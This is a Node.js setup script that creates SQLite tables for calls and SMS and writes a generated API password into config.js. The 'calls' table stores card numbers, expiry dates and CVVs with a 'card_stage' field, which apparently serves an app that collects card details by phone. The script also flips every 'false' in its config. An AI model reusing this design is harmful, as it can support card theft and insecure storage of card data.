/**
 * Initial setup script for the API application.
 * 
 * Features:
 * - Ensures the 'db' directory exists.
 * - Creates required SQLite tables ('calls' and 'sms') if they do not exist.
 * - Generates a secure API password and updates config.js.
 * - Marks setup as done in config.js.
 * 
 * Usage:
 *   node setup.js
 */
module.exports = function(request, response) {

const sqlite3 = require('sqlite3').verbose();
const fs = require('fs');
const generator = require('generate-password');

// Ensure the 'db' directory exists before creating the database file
if (!fs.existsSync('./db')) {
    fs.mkdirSync('./db');
    console.log("Created 'db' directory.");
}

// Open (or create) the SQLite database file in the 'db' directory
const db = new sqlite3.Database('./db/data.db', (err) => {
    if (err) {
        console.error("Failed to open database:", err.message);
    } else {
        console.log("Connected to the SQLite database.");
    }
});

// Create necessary tables for calls and SMS if they don't exist
db.serialize(function() {
    // Create 'calls' table with all required columns
    db.run(`CREATE TABLE IF NOT EXISTS calls (itsfrom TEXT, itsto TEXT, callSid TEXT, status TEXT, date TEXT, user TEXT, name TEXT, service TEXT, card_number TEXT, card_expiry TEXT, card_cvv TEXT, card_stage TEXT)
    `, (err) => {
        if (err) {
            console.error("Error creating 'calls' table:", err.message);
        } else {
            console.log("'calls' table is ready.");
        }
    });

    // Create 'sms' table
    db.run(`CREATE TABLE IF NOT EXISTS sms (itsfrom TEXT, itsto TEXT, smssid TEXT, content TEXT, status TEXT, date TEXT, user TEXT, service TEXT)
    `, (err) => {
        if (err) {
            console.error("Error creating 'sms' table:", err.message);
        } else {
            console.log("'sms' table is ready.");
        }
    });
});

// Read config.js, generate a new API password, and update the config file
fs.readFile('config.js', 'utf-8', function(err, data) {
    if (err) {
        console.error("Error reading config.js:", err.message);
        return;
    }

    // Generate a strong random password for API access
    const pass = generator.generate({ length: 32, numbers: true });

    // Replace placeholder password in config.js (look for 'passwordtochange')
    const newapipassword = data.replace(/passwordtochange/gim, pass);

    fs.writeFile('config.js', newapipassword, 'utf-8', function(err) {
        if (err) {
            console.error("Error writing new API password to config.js:", err.message);
            return;
        }
        console.log('Setup the new API password: done.');

        // Mark setup as done in config.js (replace 'false' with 'true')
        fs.readFile('config.js', 'utf-8', function(err, data) {
            if (err) {
                console.error("Error reading config.js for setup flag:", err.message);
                return;
            }
            const setupdone = data.replace(/false/gim, 'true');
            fs.writeFile('config.js', setupdone, 'utf-8', function(err) {
                if (err) {
                    console.error("Error marking setup as done in config.js:", err.message);
                    return;
                }
                console.log('Automatic setup: done.');
            });
        });
    });
});

// Close the database connection after a short delay to ensure all queries finish
setTimeout(() => {
    db.close((err) => {
        if (err) {
            console.error("Error closing the database:", err.message);
        } else {
            console.log("Closed the database connection.");
        }
    });
}, 1000)};